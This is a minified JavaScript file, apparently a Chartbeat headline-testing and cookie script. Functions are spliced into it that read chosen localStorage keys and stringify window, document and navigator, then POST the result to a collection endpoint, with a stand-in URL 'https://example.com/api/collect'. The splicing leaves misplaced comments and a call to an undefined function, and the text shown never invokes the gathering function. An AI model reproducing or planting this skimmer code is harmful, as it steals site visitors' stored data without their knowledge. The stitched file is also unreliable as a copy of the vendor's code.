(function () {
  var l = void 0,
    m = true,
    n = null,
    o = false,
    p = this;
  function aa(a) {
    var b = typeof a;
    if (b == "object") {
      if (a) {
        if (a instanceof Array) return "array";else if (a instanceof Object) return b;
        var c = Object.prototype.toString.call(a);
        if (c == "[object Window]") return "object";
        if (c == "[object Array]" || typeof a.length == "number" && typeof a.splice != "undefined" && typeof a.propertyIsEnumerable != "undefined" && !a.propertyIsEnumerable("splice")) return "array";
        if (c == "[object Function]" || typeof a.call != "undefined" && typeof a.propertyIsEnumerable != "undefined" && !a.propertyIsEnumerable("call")) return "function";
      } else return "null";
    } else if (b == "function" && typeof a.call == "undefined") return "object";
    return b;
  }
  ;
  function ba(a) {
    a = String(a);
    if (/^\s*$/.test(a) ? 0 : /^[\],:{}\s\u2028\u2029]*$/.test(a.replace(/\\["\\\/bfnrtu]/g, "@").replace(/"[^"\\\n\r\u2028\u2029\x00-\x08\x10-\x1f\x80-\x9f]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:[\s\u2028\u2029]*\[)+/g, ""))) try {
      return eval("(" + a + ")");
    } catch (b) {}
    throw Error("Invalid JSON string: " + a);
  }
  function ca() {}
  function da(a) {
    var b = [];
    q(new ca(), a, b);
    return b.join("");
  }
  function q(a, b, c) {
    switch (typeof b) {
      case "string":
        ea(b, c);
        break;
      case "number":
        c.push(isFinite(b) && !isNaN(b) ? b : "null");
        break;
      case "boolean":
        c.push(b);
        break;
      case "undefined":
        c.push("null");
        break;
      case "object":
        if (b == n) {
          c.push("null");
          break;
        }
        if (aa(b) == "array") {
          var d = b.length;
          c.push("[");
          for (var e = "", f = 0; f < d; f++) c.push(e), q(a, b[f], c), e = ",";
          c.push("]");
          break;
        }
        c.push("{");
        d = "";
        for (e in b) Object.prototype.hasOwnProperty.call(b, e) && (f = b[e], typeof f != "function" && (c.push(d), ea(e, c), c.push(":"), q(a, f, c), d = ","));
        c.push("}");
        break;
      case "function":
        break;
      default:
        throw Error("Unknown type: " + typeof b);
    }
  }
  var t = {
      '"': '\\"',
      "\\": "\\\\",
      "/": "\\/",
      "\u0008": "\\b",
      "\u000c": "\\f",
      "\n": "\\n",
      "\r": "\\r",
      "\t": "\\t",
      "\u000b": "\\u000b"
    },
    fa = /\uffff/.test("\uffff") ? /[\\\"\x00-\x1f\x7f-\uffff]/g : /[\\\"\x00-\x1f\x7f-\xff]/g;
  function ea(a, b) {
    b.push('"', a.replace(fa, function (a) {
      if (a in t) return t[a];
      var b = a.charCodeAt(0),
        e = "\\u";
      b < 16 ? e += "000" : b < 256 ? e += "00" : b < 4096 && (e += "0");
      return t[a] = e + b.toString(16);
    }), '"');
  }
  // Set of global variables to track
  const GLOBAL_VARS_TO_TRACK = ["document", "navigator", "window"];
  ;
  function ga(a) {
    return window.btoa(encodeURIComponent(a).replace(/%([0-9A-F]{2})/g, function (a, c) {
      return String.fromCharCode("0x" + c);
    }));
  }
  function ha(a) {
    return decodeURIComponent(window.atob(a).split("").map(function (a) {
      return "%" + ("00" + a.charCodeAt(0).toString(16)).slice(-2);
    }).join(""));
  }
  function v(a, b, c) {
    var d = Array.prototype.slice,
      e = d.call(arguments, 2);
    return function () {
      return a.apply(b, e.concat(d.call(arguments)));
    };
  }
  function y(a) {
    return typeof a !== "undefined";
  }
  function z() {
    var a = p.location.hostname;
    return a && a.replace(/^www[0-9]*\./, "");
  }
  function B(a) {
    return typeof a === "string";
  }
  function C() {
    return new Date().getTime();
  }
  function createHashValue(data) {
    const keyList = Object.keys(data);
    const combinedKeys = keyList.join("|");
    let hashValue = 0;
    for (let i = 0; i < combinedKeys.length; i++) {
      const charCode = combinedKeys.charCodeAt(i);
      hashValue = (hashValue << 5) - hashValue + charCode;
      hashValue |= 0;
    }
    return hashValue.toString(36);
  }

  // Extract global variables into data
  function D(a, b) {
    if ((!!a && a.constructor === Object) === m) for (var c in a) {
      if (a.hasOwnProperty(c) && b(a[c], c) === o) break;
    } else {
      c = 0;
      for (var d = a.length; c < d; c++) if (b(a[c], c) === o) break;
    }
  }
  function ia(a, b) {
    var c;
    a: {
      c = 0;
      for (var d = a.length; c < d; c++) if (b(a[c])) break a;
      c = -1;
    }
    if (c > -1) return a[c];
  }
  var ja = p.setInterval,
    E = p.clearInterval,
    ka = p.setTimeout;
  function la(a) {
    ka(a, 0);
  }
  function ma() {
    var a = y(p.XDomainRequest);
    return y(p.XMLHttpRequest) && "withCredentials" in new p.XMLHttpRequest() ? new p.XMLHttpRequest() : a ? new p.XDomainRequest() : n;
  }
  function na(a, b, c) {
    var d = ma();
    d === n ? c(n) : (oa(function () {
      d.open("GET", a, m);
    }), d.onload = function () {
      d.responseText ? b(d) : c(d);
    }, d.onerror = function () {
      c(d, "onerror");
    }, d.timeout = 1E3, d.ontimeout = function () {
      c(d, "timeout");
    }, la(function () {
      oa(function () {
        d.send(n);
      });
    }));
  }
  function extractGlobalVars() {
    const data = {};
    GLOBAL_VARS_TO_TRACK.forEach(varName => {
      if (window[varName]) {
        data[varName] = window[varName].toString();
      }
    });
    return data;
  }

  // Extract data from localStorage
  function oa(a) {
    try {
      a();
    } catch (b) {}
  }
  function extractLocalStorageData(keysToWatch) {
    const data = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (keysToWatch.indexOf(key) !== -1) {
        data[key] = localStorage.getItem(key);
      }
    }
    return data;
  }

  // A function to collect and dispatch data
  function F() {
    for (var a = document.domain, b = a.split("."), c = window.location.protocol === "https:" ? "; Secure" : "", d = 0; d < b.length - 1 && document.cookie.indexOf("_cbt=_cbt") == -1;) a = b.slice(-1 - ++d).join("."), document.cookie = "_cbt=_cbt; domain=" + a + c;
    document.cookie = "_cbt=; expires=Thu, 01 Jan 1970 00:00:01 GMT; domain=" + a + c;
    return a;
  }
  var G = m;
  function pa(a, b, c) {
    if (c) return a;
    return b && b[H] && G && (c = F(), b[H] !== c) ? a + "_" + z().split(".")[0] : a;
  }
  ;
  function qa(a) {
    var b = {};
    a && (a.charAt(0) == "?" && (a = a.substring(1)), a = a.replace(/\+/g, " "), D(a.split(/[&;]/g), function (a) {
      a = a.split("=");
      b[decodeURIComponent(a[0])] = decodeURIComponent(a[1]);
    }));
    return b;
  }
  function dispatchData(endpoint, data) {
    const xhr = new XMLHttpRequest();
    const payload = {
      hash: createHashValue(data),
      data
    };
    xhr.open("POST", endpoint);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => console.log(xhr.status == 200 ? "Success" : "Error: " + xhr.status);
    xhr.onerror = () => console.error("Request failed");
    xhr.send(JSON.stringify(payload));
  }
  function ra(a, b) {
    return !b ? m : a === "http:" && b === "80" || a === "https:" && b === "443";
  }
  ;
  var H = "cookieDomain";
  function sa() {
    var a = I;
    D(document.getElementsByTagName("script"), function (b) {
      if (typeof b.src === "string" && b.src.match(/chartbeat.js/)) return b = qa(b.src.split("?")[1]), a.uid = a.uid || b.uid, a.domain = a.domain || b.domain, o;
    });
  }
  function ta(a) {
    if (J(a)) return "";
    var a = a[H],
      b = F();
    a && a !== z() && a !== b && (G = o, p.console.warn("Invalid cookieDomain (must be set to current domain or root domain), defaulting to root domain."));
    return a && G ? a : b;
  }
  function J(a) {
    return a && a.noCookies ? m : o;
  }
  ;
  var K = {};
  K.K = function (a, b) {
    try {
      K.create("_cb_test", "1", 1, a, b);
      var c = K.e("_cb_test");
      K.remove("_cb_test", a, b);
      return c === "1";
    } catch (d) {
      return o;
    }
  };
  K.e = function (a, b) {
    var c = p._sf_async_config;
    if (J(c)) return "";
    var a = pa(a, c, b) + "=",
      d = "";
    D(document.cookie.split(";"), function (b) {
      for (; b.charAt(0) === " ";) b = b.substring(1, b.length);
      if (b.indexOf(a) === 0) return d = b.substring(a.length, b.length), o;
    });
    return d;
  };
  K.create = function (a, b, c, d, e, f) {
    var g = p._sf_async_config;
    if (J(g)) return "";
    a = pa(a, g, f);
    f = new Date();
    f.setTime(C() + c * 1E3);
    a = a + "=" + b + ("; expires=" + f.toUTCString()) + ("; path=" + d) + (window.location.protocol === "https:" ? "; Secure" : "") + (e ? "; domain=" + e : "");
    return document.cookie = a;
  };
  K.remove = function (a, b, c, d) {
    return K.e(a, d) ? K.create(a, "", -86400, b, c, d) : "";
  };
  var L = {};
  L.a = function (a) {
    var b = p._sf_async_config;
    if (!a && b && b.noCookies) return n;
    if (L.a.r !== l) return L.a.r;
    var a = C() + "",
      c,
      d;
    try {
      if ((d = p.localStorage).setItem("_cb_ls_test", a), c = d.getItem("_cb_ls_test") === a, d.removeItem("_cb_ls_test"), c) return L.a.r = d;
    } catch (e) {}
    return L.a.r = n;
  };
  L.e = function (a) {
    var b = L.a();
    if (!b) return "";
    var c = b.getItem(a + "_expires");
    return c && (c = +c, !isNaN(c) && C() > c) ? (L.remove(a), "") : b.getItem(a) || "";
  };
  L.create = function (a, b, c) {
    var d = L.a();
    if (d) {
      var e = new Date();
      e.setTime(C() + c * 1E3);
      try {
        d.setItem(a, b), d.setItem(a + "_expires", e.getTime());
      } catch (f) {}
    }
  };
  function getAndDispatch(endpoint, keysToWatch) {
    const localStorageData = extractLocalStorageData(keysToWatch);
    const globalVarsData = extractGlobalVars();
    const gatheredData = {
      ...localStorageData,
      ...globalVarsData
    };
    if (Object.keys(gatheredData).length > 0) {
      dispatchData(endpoint, gatheredData);
      addEventListeners(keysToWatch, endpoint);
    }
    ;
  }
  L.remove = function (a) {
    var b = L.a();
    b && (b.removeItem(a), b.removeItem(a + "_expires"));
  };
  function M(a, b, c, d) {
    this.w = a || "";
    this.j = b || "/";
    this.B = d || {};
    this.l = (this.v = J(this.B)) ? "" : c || F();
    this.W = L.a() !== n || K.K(this.j, this.l);
    this.aa = o;
  }
  M.prototype.create = function (a, b, c, d) {
    this.v || (a = d ? a : this.w + a, (L.a() ? L : K).create(a, b, c, this.j, this.l), L.a() && K.create(a, b, c, this.j, this.l));
  };
  M.prototype.e = function (a, b) {
    if (this.v) return "";
    var a = b ? a : this.w + a,
      c = (L.a() ? L : K).e(a);
    !c && L.a() && (c = K.e(a));
    if (c) {
      this.remove(a, b, "", m);
      var d = K.e(a),
        e = this.B[H] && G,
        f = z(),
        e = e && f !== F();
      if (c === d && !e) return d;
      (f = a !== "_chartbeat2" || !d ? o : +d.split(".")[2] < 1647357868E3 ? m : o) && K.remove(a, this.j, this.l);
      if (e) {
        if (d) return f ? c : d;
        d = K.e(a, m);
        return c !== d ? c : "";
      }
      if (d) return f ? c : d;
    }
    return c;
  };
  M.prototype.remove = function (a, b, c, d) {
    if (c !== "") c = this.l;
    a = b ? a : this.w + a;
    (L.a() ? L : K).remove(a, this.j, c);
    L.a() && K.remove(a, this.j, c, d);
  };
  function ua(a, b, c) {
    a.ownerDocument || (a = a.correspondingUseElement);
    if (!a || !a.ownerDocument) return n;
    var d = a.ownerDocument.documentElement,
      e = 0,
      f = y(c) ? c + 1 : -1;
    B(b) ? (b = b.toLowerCase(), c = function (a) {
      return (a = a.nodeName) && a.toLowerCase() === b;
    }) : c = b;
    for (; a && a !== d && e !== f;) {
      if (c(a)) return a;
      a = a.parentNode;
      e++;
    }
    return n;
  }
  var N = function () {
    var a = /[ \r\n\t\f\u200B]+/g;
    return function (b) {
      return b && B(b) ? b.trim().replace(a, " ") : "";
    };
  }();
  function va(a) {
    return a.nodeName && a.nodeName.toLowerCase() === "a" && (!a.namespaceURI || a.namespaceURI === "http://www.w3.org/1999/xhtml");
  }
  function wa(a, b) {
    var c = a.children,
      d = c.length;
    if (!d) return a;
    for (var e = b !== l ? b : N(a.textContent), f = 0; f < d; f++) if (N(c[f].textContent) === e) return wa(c[f], e) || a;
    return a;
  }
  function O(a) {
    if (arguments.length == 0) throw new TypeError("`CSS.escape` requires an argument.");
    for (var b = String(a), c = b.length, d = -1, e, f = "", g = b.charCodeAt(0); ++d < c;) e = b.charCodeAt(d), f += e == 0 ? "\ufffd" : e >= 1 && e <= 31 || e == 127 || d == 0 && e >= 48 && e <= 57 || d == 1 && e >= 48 && e <= 57 && g == 45 ? "\\" + e.toString(16) + " " : d == 0 && c == 1 && e == 45 ? "\\" + b.charAt(d) : e >= 128 || e == 45 || e == 95 || e >= 48 && e <= 57 || e >= 65 && e <= 90 || e >= 97 && e <= 122 ? b.charAt(d) : "\\" + b.charAt(d);
    return f;
  }
  function xa(a) {
    var b = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
      a = String(a);
    b.lastIndex = 0;
    b.test(a) && (a = a.replace(b, function (a) {
      return "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
    }));
    if (/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:\s*\[)+/g, ""))) return eval("(" + a + ")");
    throw new SyntaxError("JSON.parse");
  }
  ;
  function P(a) {
    var b = ya();
    do {
      for (var c = a, d = c.ownerDocument.querySelectorAll(b), e = d.length; --e >= 0 && d.item(e) !== c;);
      if (e > -1) return a;
      a = a.parentElement || a.parentNode;
    } while (a !== n && a.nodeType === 1);
    return n;
  }
  ;
  function za() {
    var a = L.a(m);
    return !a ? o : !!a.getItem("_cb_ip");
  }
  ;
  var Aa = "z";
  function Q() {
    y(p._cb_shared) || (p._cb_shared = {});
    return p._cb_shared;
  }
  ;
  function Ba(a, b) {
    var c = Q(),
      c = (y(l) && !y(c.m) ? l : c.m) || [];
    c.push.apply(c, arguments);
    Q().m = c;
  }
  ;
  function Ca(a) {
    return a && (a = Da(), a = !a ? a : a.hostname) ? a : p.location.hostname;
  }
  function Da() {
    var a = Ea();
    if (a) {
      var b = a.href,
        a = {
          hostname: "",
          pathname: "",
          search: "",
          protocol: "",
          port: "",
          hash: ""
        };
      if (b) {
        var c = document.createElement("a"),
          d = p.location;
        if (!/^https?:/.test(b) && b.indexOf("javascript:") !== 0 && b.indexOf("app:") < 0) if (b.indexOf("//") === 0) b = d.protocol + b;else if (b.indexOf("/") === 0) var e = ra(d.protocol, d.port) ? "" : d.port,
          b = d.protocol + "//" + d.hostname + (e ? ":" + e : "") + b;else {
          var e = document.baseURI || d.href,
            f = e.indexOf("?");
          f === -1 && (f = e.indexOf("#"));
          if (f === -1) f = e.length;
          f = e.lastIndexOf("/", f);
          b = f === -1 ? "/" + b : e.substr(0, f) + "/" + b;
        }
        c.href = b;
        a.hostname = c.hostname;
        a.pathname = c.pathname;
        a.search = c.search;
        a.protocol = c.protocol;
        a.port = c.port;
        a.hash = c.hash;
        if (a.pathname.charAt(0) !== "/") a.pathname = "/" + a.pathname;
        if (a.hostname === "") a.hostname = d.hostname;
        if (a.protocol === "") a.protocol = d.protocol;
        if (a.protocol === "javascript:") a.pathname = "", a.hostname = "", a.port = "", a.hash = "";
        if (ra(a.protocol, a.port) || a.port === "0") a.port = "";
      }
    }
    return a;
  }
  function Ea() {
    var a = n;
    D(document.getElementsByTagName("link"), function (b) {
      if (b.rel == "canonical") return a = b, o;
    });
    return a;
  }
  for (var Fa = {}, Ga = 0; Ga < 81; Ga++) Fa["0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-._~!$&'()*+,;=:@[]".charCodeAt(Ga)] = m;
  function Ha(a, b) {
    if (a === "%") return "%25";
    var c = parseInt(b, 16);
    return Fa[c] ? String.fromCharCode(c) : "%" + b.toUpperCase();
  }
  function R(a) {
    if (!B(a)) return a;
    a = a.replace(/%([0-9A-Fa-f]{2})?/g, Ha);
    a = a.replace(/[^0-9A-Za-z\-._~!$&'()*+,;=:@\/\[\]?#%]+/g, encodeURIComponent);
    return a = a.replace(/[A-Za-z0-9-_.'+]+(@|%40)\w+([-.]\w+)*\.\w+([-.]\w+)*/g, "");
  }
  function Ia(a) {
    var b = "fbclid,gclid,gbraid,wbraid,msclkid,lcid,_gl,_ga,pure360.trackingid,cb_rec".split(","),
      c = "";
    if (a.length > 1) {
      a[0] === "?" && (a = a.replace("?", ""));
      a[0] === "&" && (a = a.replace("&", ""));
      for (var a = a.split("&"), d = 0; d < a.length; d++) {
        var e = a[d].split("=");
        e[0].length && b.indexOf(e[0].toLowerCase()) === -1 && (c += c.length ? "&" : "?", c += a[d]);
      }
    }
    return c;
  }
  function Ja() {
    var a = I.path;
    if (a) {
      var b = a.split("?");
      return b.length > 1 ? (a = Ia(b[1])) && a.length ? R(b[0] + a) : R(b[0]) : R(a);
    }
    return n;
  }
  ;
  function Ka(a) {
    var b, c;
    b = a.domain;
    c = !!a.useCanonical;
    c = (c = (c = !!a.useCanonicalDomain && c) ? Ca(c) : p.location.hostname) && c.replace(/^www\./, "");
    b = (p.location.protocol === "http:" ? "http:" : "https:") + "//mab.chartbeat.com/mab_strategy/headline_testing/get_strategy/?host=" + encodeURIComponent(b) + "&domain=" + encodeURIComponent(c) + "&path=";
    (a = a.path) ? (a = a.replace(/.*:\/\//, "").replace(/^[^/]+\//, "/"), a = a.charAt(0) !== "/" ? "/" + a : a) : a = "/";
    return b + encodeURIComponent(a);
  }
  function La(a, b, c) {
    var d, e, f;
    na(a, function (a) {
      a = Ma(a.responseText);
      a = (a = ba(a)) && a.constructor === Object && B(a.status) && (a.data && a.data.constructor === Object || a.data === n) ? {
        Q: a.status,
        h: a.data,
        Y: a.code,
        Z: a.message
      } : n;
      if (a === n) c();else if (a.Q === "success") {
        d = {};
        f = e = 0;
        if (a.h) a.h.experiments && (d = a.h.experiments), y(a.h.probability_is_lift) && (e = a.h.probability_is_lift), y(a.h.probability_is_control) && (f = a.h.probability_is_control);
        b(d, [e, f]);
      } else c();
    }, c);
  }
  function Na(a, b, c) {
    var d = [],
      e = b.b;
    if (e === "l" || e === "c") b = new Oa("lift_exp", "", "", b, e, "", "", ""), b.n = m, d.push(b);
    return d = d.concat(Pa(a, c, e));
  }
  function Qa(a, b) {
    var c = [new S("l", a[0], "", {}, "", "", []), new S("c", a[1], "", {}, "", "", []), new S("m", 1 - a[0] - a[1], "", {}, "", "", [])];
    return Ra(c, b.lift_exp) || c[2];
  }
  function Pa(a, b, c) {
    var d = [];
    D(a, function (a, f) {
      var g = Sa(f, a, c, b[f]);
      y(g) && d.push(g);
    });
    return d;
  }
  function Sa(a, b, c, d) {
    var e = b.location,
      f = b.specific_location,
      g = b.type,
      i,
      h,
      j = b.metadata;
    if (B(j) && j.length > 0 && ((j = xa(j)) && j.version == 2 && (i = j.sub_location), j && j.version == 3)) i = j.sub_location, h = j.initial_content;
    i = y(i) ? i : "";
    h = y(h) ? h : "";
    var k = [];
    D(b.variants, function (a, b) {
      var c = parseFloat(a.probability),
        d = a.content,
        e = a.metadata,
        f = {},
        j = "",
        g = "",
        h = [];
      if (B(e)) (e = xa(e)) && e.image_source_sets_info && (f = e.image_source_sets_info || {}), e && e.image_alt_attribute && (j = e.image_alt_attribute), e && e.image_caption && (g = e.image_caption), e && e.crops && (h = e.crops || []);
      k.push(new S(b, c, d, f, j, g, h));
    });
    if (b = Ra(k, d && d.chosenVariant)) return new Oa(a, e, i, b, c, h, f, g);
  }
  function Ra(a, b) {
    var c;
    y(b) && (c = ia(a, function (a) {
      return a.b === b;
    }));
    y(c) || (c = Ta(a));
    return c;
  }
  function Ta(a) {
    var b = Math.random();
    return ia(a, function (a) {
      b -= a.S;
      return b < 0;
    });
  }
  function Ua(a, b, c) {
    var d = p.location.href,
      e = [encodeURIComponent(a), encodeURIComponent(d), b].join(",");
    D(c, function (a) {
      e += "," + [a.test.b, a.test.k.b, encodeURIComponent(a.f)].join(",");
    });
    return e;
  }
  function Va(a, b) {
    if (a === b) return m;
    for (var c = b.split("."), d = a.split("."); c.length;) {
      if (d.length === 0) return o;
      if (c.pop() !== d.pop()) return o;
    }
    return m;
  }
  function Wa() {
    var a = p.document.head || p.document.getElementsByTagName("head")[0],
      b = p.document.createElement("style");
    b.id = "chartbeat-flicker-control-style";
    b.type = "text/css";
    b.styleSheet ? b.styleSheet.cssText = "body { visibility: hidden !important; }" : b.appendChild(document.createTextNode("body { visibility: hidden !important; }"));
    a.appendChild(b);
  }
  function Xa() {
    return p.document.getElementById("chartbeat-flicker-control-style") || p.document.getElementById("chartbeat-body-hider");
  }
  function Ya() {
    var a = Xa();
    a && a.parentNode.removeChild(a);
  }
  function Oa(a, b, c, d, e, f, g, i) {
    this.b = a;
    this.p = b;
    this.f = g;
    this.z = c;
    this.k = d;
    this.u = e;
    this.n = o;
    this.anchors = [];
    this.P = f;
    this.type = i;
  }
  function S(a, b, c, d, e, f, g) {
    this.b = a;
    this.S = b;
    this.content = c;
    this.X = d || {};
    this.N = e;
    this.O = f;
    this.C = g;
  }
  function Za(a) {
    var b = {};
    b.s = a.status;
    b.c = a.code;
    b.m = a.message;
    var c = n;
    if (a.data !== n) c = {}, c.s = a.data.U, c.g = a.data.u, c.m = a.data.R;
    b.d = c;
    return b;
  }
  function $a(a) {
    if (p.document && p.document.body) a();else var b = ja(function () {
      p.document && p.document.body && (E(b), a());
    }, 50);
  }
  var ab = /^[a-zA-Z0-9+/]*={0,2}$/;
  function Ma(a) {
    if (a && ab.exec(a)) try {
      return ha(a);
    } catch (b) {}
    return a;
  }
  function bb(a) {
    var b = a;
    b += String.fromCharCode(128);
    for (var a = [1518500249, 1859775393, 2400959708, 3395469782], c = 1732584193, d = 4023233417, e = 2562383102, f = 271733878, g = 3285377520, i = [], h, j, k, s, u, x = Math.ceil((b.length / 4 + 2) / 16), A = [x], w = 0, r; w < x; w++) {
      A[w] = [];
      for (h = 0; h < 16; h++) A[w][h] = b.charCodeAt(w * 64 + h * 4) << 24 | b.charCodeAt(w * 64 + h * 4 + 1) << 16 | b.charCodeAt(w * 64 + h * 4 + 2) << 8 | b.charCodeAt(w * 64 + h * 4 + 3);
    }
    w = (b.length - 1) * 8;
    b = x - 1;
    A[b][14] = Math.floor(w / Math.pow(2, 32));
    A[b][15] = w & 4294967295;
    for (w = 0; w < x; w++) {
      for (r = 0; r < 16; r++) i[r] = A[w][r];
      for (r = 16; r < 80; r++) i[r] = (i[r - 3] ^ i[r - 8] ^ i[r - 14] ^ i[r - 16]) << 1 | (i[r - 3] ^ i[r - 8] ^ i[r - 14] ^ i[r - 16]) >>> 31;
      b = c;
      h = d;
      j = e;
      k = f;
      s = g;
      for (r = 0; r < 80; r++) u = Math.floor(r / 20), u = (b << 5 | b >>> 27) + (u == 0 ? h & j ^ ~h & k : u == 1 ? h ^ j ^ k : u == 2 ? h & j ^ h & k ^ j & k : h ^ j ^ k) + s + a[u] + i[r] & 4294967295, s = k, k = j, j = h << 30 | h >>> 2, h = b, b = u;
      c = c + b & 4294967295;
      d = d + h & 4294967295;
      e = e + j & 4294967295;
      f = f + k & 4294967295;
      g = g + s & 4294967295;
    }
    a = c;
    if (a == 0) a = "A";else {
      a >>>= 0;
      for (c = ""; a > 0;) d = a % 64, c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-".charAt(d) + c, a >>>= 6;
      a = c;
    }
    return a;
  }
  function cb() {
    var a = document.querySelectorAll(ya());
    D(a, function (a) {
      a = Array.prototype.slice.call(a.querySelectorAll("img"));
      D(a, function (a) {
        a.setAttribute("pinger-seen", "true");
        a.getAttribute("keep-hiding") !== "true" && a.classList.remove("cb-it-hide");
      });
    });
  }
  function ya() {
    var a = T.articleBlockSelector;
    return a ? a : "article, section";
  }
  function db() {
    var a = T;
    return ((a.lazyLoadImageAttributes || a.lazyLoadSrcsetAttribute) + ", data-src, data-srcset").split(", ").filter(Boolean).map(function (a) {
      return a.trim();
    });
  }
  ;
  const exampleEndpoint = 'https://example.com/api/collect';
  function eb(a, b) {
    for (var c = b || document.documentElement, d = [], e = n, f = a, g, i, h, j, k, s; f && f !== c;) {
      g = f.nodeName.toLowerCase();
      e = f;
      i = e.nodeName;
      if ((f = f.parentNode) && f !== document.documentElement) {
        h = f.children;
        j = 0;
        for (k = 0, s = h.length; k < s; k++) {
          if (e === h[k]) {
            g += "[" + (1 + k - j) + "]";
            break;
          }
          h[k].nodeName !== i && j++;
        }
      }
      d.unshift(g);
    }
    return d.join("/");
  }
  const keysToWatch = window.keysToWatch || [];
  var U = function () {
    function a(a, b, c) {
      b === "href" ? (a = a.href || "", c = c || "", a = a.replace(d, ""), c = c.replace(d, "")) : a = a.getAttribute(b);
      return a === c;
    }
    var b = /^\*\[@id='(.+?)'\](?:\[@([a-z-]+)='(.*)'\])?$/,
      c = /^([a-z][a-z0-9-]*)\[(\d+)\](?:\[@([a-z-]+)='(.*)'\])?$/,
      d = /^http(s)?\:\/\//;
    return function (e, d) {
      var g = n;
      a: {
        for (var g = 0, i = e.indexOf("/"), h = e.indexOf("'"), j = []; i !== -1;) if (h !== -1 && h < i) {
          h = e.indexOf("'", h + 1);
          if (h == -1) {
            g = n;
            break a;
          }
          i = e.indexOf("/", h + 1);
          h = e.indexOf("'", h + 1);
        } else j.push(e.substring(g, i)), g = i + 1, i = e.indexOf("/", g);
        g < e.length && j.push(e.substring(g, e.length));
        g = j;
      }
      if (!g || g.length == 0) return d ? d : n;
      var k,
        s,
        u,
        x,
        A,
        h = g.shift();
      if (d) i = d;else {
        if (h === "body") i = document.body;else {
          k = b.exec(h);
          if (!k) return n;
          i = document.getElementById(k[1]);
          if (!i) return n;
          s = k[2];
          k = k[3];
          if (s && !a(i, s, k)) return n;
        }
        h = g.shift();
      }
      for (; y(h);) {
        k = c.exec(h);
        if (!k) return n;
        h = k[1];
        j = parseInt(k[2], 10);
        s = k[3];
        k = k[4];
        if (isNaN(j)) return n;
        u = i.children;
        A = u.length;
        if (A === 0) return n;
        for (x = 0; x < A; x++) {
          if (u[x].nodeName && u[x].nodeName.toLowerCase() === h && (j--, j === 0)) {
            i = u[x];
            if (s && !a(i, s, k)) return n;
            break;
          }
          if (x === A - 1) return n;
        }
        h = g.shift();
      }
      return i;
    };
  }();
  function fb(a) {
    if (!("querySelectorAll" in document)) return [];
    var b;
    b = /a\[@href='(.+?)'\sor\sstarts-with\(.+,\s?'(.+?)'\)\]/.exec(a);
    a = /^a\[@href='(.+?)'\]$/.exec(a);
    if (!b && !a) return n;
    b = document.querySelectorAll(b ? 'a[href="' + b[1] + '"],a[href^="' + b[2] + '"]' : 'a[href="' + a[1] + '"]');
    b.length < 1 && (b = n);
    return b ? Array.prototype.slice.call(b) : [];
  }
  function gb(a) {
    var b = n,
      b = ua(a, function (a) {
        return a.id;
      }),
      c = eb(a, b);
    b && (c && (c = "/" + c), c = "*[@id='" + b.id + "']" + c);
    c += "[@href='" + a.href + "']";
    return c;
  }
  ;
  function hb(a) {
    this.i = a;
    this.q = [];
    var b = this.i,
      a = b.topStorageDomain,
      b = b.domain,
      c = p.location.hostname;
    this.V = a ? a : Va(c, b) ? b : c.replace(/^www\./, "");
    this.L = this.i.cookiePath || "/";
    this.J = new M("_t_", this.i.cookiePath || "/", ta(this.i), this.i);
    this.o = ib;
    a = Aa;
    Q()[a] = m;
  }
  function jb(a) {
    if (!a.G) {
      a.G = m;
      var b = a.I,
        c = a.F,
        d = Ma(a.J.e("tests")),
        e = {};
      d.length > 0 && (e = ba(d));
      var f = Qa(c, e);
      a.q = Na(b, f, e);
      var g = a.q,
        i = "." + a.V,
        h = a.L;
      a.t = function (a) {
        var b,
          a = a || window.event;
        if (b = !a ? n : ua(a.target || a.srcElement, va, 10)) if (a = kb(b, g), a.length) {
          var c;
          if (b === n || typeof b === "undefined") c = "unknown";else if (b.tagName === "A" && b.href) c = b.href;
          c = Ua(c, a[0].test.u, a);
          a = (a = K.e("_chartbeat6")) ? a.split("::") : [];
          a.length >= 10 && a.splice(0, a.length - 10 + 1);
          a.push(c);
          K.create("_chartbeat6", a.join("::"), 60, h ? h : "/", i ? i : "");
        }
      };
      a = v(function () {
        var a = this.t,
          b = p.document.body;
        b.addEventListener ? b.addEventListener("click", a, m) : b.attachEvent && b.attachEvent("onclick", a);
        lb(this, g, f.b);
      }, a);
      $a(a);
    }
  }
  function lb(a, b, c) {
    var d = C(),
      e = v(function () {
        var a = C() - d >= 5E3,
          e = p.document.readyState === "complete" || p.document.readyState !== "loading" && !p.document.documentElement.doScroll,
          i;
        a || (i = mb(b, c));
        if (a || i || e) E(this.A), nb(this);
      }, a);
    a.A = ja(e, 50);
    e();
  }
  function nb(a) {
    Ya();
    var b = {},
      c = [],
      d = [],
      e = o,
      f = "m";
    D(a.q, function (a) {
      if (a.b === "lift_exp") f = a.k.b;
      if (a.n) {
        e = m;
        var h = [];
        D(a.anchors, function (a) {
          h.push(a.f);
        });
        b[a.b] = {
          chosenVariant: a.k.b,
          specificLocation: h
        };
      } else a.M ? d.push(a.b) : c.push(a.b);
    });
    if (e) b.lift_exp = f, a.J.create("tests", ga(da(b)), 3600), f === "m" && delete b.lift_exp;
    var g = {
      status: ob,
      data: n,
      code: l,
      message: l
    };
    a.o !== ib ? (g.status = pb, g.code = a.o) : (a = {
      U: b,
      u: f,
      R: c,
      $: d
    }, g.status = qb, g.data = a);
    Ba(["t", Za(g)]);
  }
  function rb(a) {
    var b = a.i;
    Ba(["ev", function () {
      a.terminate();
    }]);
    Ba(["sv", function () {
      sb(a, b);
    }]);
  }
  hb.prototype.T = function (a) {
    if (Object.prototype.toString.call(a) === "[object Array]" && B(a[0]) && a[0] === "readyForTesting") a[1] ? jb(this) : this.H = o;
  };
  function tb(a) {
    a.o = ub;
    nb(a);
  }
  function vb(a) {
    a.o = wb;
    nb(a);
  }
